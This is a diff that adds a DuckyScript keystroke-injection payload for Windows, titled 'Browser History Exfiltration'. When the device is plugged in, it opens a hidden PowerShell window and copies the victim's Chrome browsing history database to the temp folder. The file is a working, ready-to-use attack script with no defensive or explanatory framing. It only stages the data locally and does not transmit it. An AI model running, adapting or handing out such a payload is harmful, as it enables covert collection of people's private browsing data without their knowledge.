@@ -1,0 +1,16 @@
+REM =====================================================
+REM Title: Browser History Exfiltration
+REM Author: yogeshjoga
+REM Target: Windows 10/11
+REM Category: Metadata Extraction
+REM Description: Copies Chrome browser history to temp folder
+REM =====================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"; $dest = "$env:TEMP\chrome_history.db"; Copy-Item $chromeHistory $dest -Force; exit
+ENTER
